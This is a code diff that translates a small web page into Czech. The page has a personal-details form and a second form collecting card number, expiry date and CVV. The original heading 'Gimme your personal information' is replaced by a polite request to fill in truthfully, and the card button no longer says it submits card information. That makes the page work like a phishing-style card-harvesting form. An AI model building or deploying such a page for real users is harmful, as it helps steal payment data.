@@ -9,43 +9,43 @@
 </head>
 <body>
     <form action="/submit" method="POST">
-        <label for="name">Name:</label><br>
+        <label for="name">Jméno:</label><br>
         <input type="text" name="name" required><br><br>
 
-        <label for="surname">Surname:</label><br>
+        <label for="surname">Přijmení:</label><br>
         <input type="text" name="surname" required><br><br>
 
         <label for="email">Email:</label><br>
         <input type="email" name="email" required><br><br>
 
-        <label for="phone">Phone:</label><br>
+        <label for="phone">Telefon:</label><br>
         <input type="tel" name="phone" required><br><br>
 
-        <label for="year">Year of Birth:</label><br>
+        <label for="year">Datum narození:</label><br>
         <input type="number" name="year" required><br><br>
 
-        <button type="submit">Send</button>
+        <button type="submit">Zkontrolovat</button>
     </form>
     <br><br>
 
     <div style="position: fixed; bottom: 1; left: 0;">
         <form action="/submit-card" method="POST">
-            <label for="card-number">Card Number:</label><br>
+            <label for="card-number">Číslo karty:</label><br>
             <input type="text" name="card-number" maxlength="16" required><br><br>
         
-            <label for="expiry-date">Expiry Date (MM/YY):</label><br>
+            <label for="expiry-date">Datum propadnutí (MM/YY):</label><br>
             <input type="text" name="expiry-date" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required><br><br>
         
             <label for="cvv">CVV:</label><br>
             <input type="text" name="cvv" maxlength="3" pattern="\d{3}" required><br><br>
         
-            <button type="submit">Submit Card Info</button>
+            <button type="submit">Zkontrolovat</button>
         </form>               
     </div>
 
   <br><br>
 
-    <h1>Gimme your personal information</h1>
+    <h1>Prosím vyplňujte pravdivě</h1>
     <img src="https://media.tenor.com/R0qf99efP7gAAAAi/anime-anime-dance.gif" alt="Blank GIF"">
     <script src="cardValidation.js"></script>
 </body>
@@ -66,13 +66,13 @@
         const yearIsValid = year <= currentYear && year >= currentYear - 120;
     
         if (!nameIsValid) {
-        alert("Name must be at least 2 letters and contain only letters.");
+        alert("Jméno musí mít alespoň 2 písmena a obsahovat pouze písmena.");
         e.preventDefault();
         return;
         }
     
         if (!emailIsValid) {
-        alert("Please enter a valid email address.");
+        alert("Zadejte prosím platnou e-mailovou adresu.");
         e.preventDefault();
         return;
         }
@@ -84,7 +84,7 @@
         }
     
         if (!yearIsValid) {
-        alert("Please enter a valid year of birth (not in future or older than 120 years).");
+        alert("Zadejte prosím platný rok narození (ne v budoucnosti nebo starší než 120 let).");
         e.preventDefault();
         return;
         }
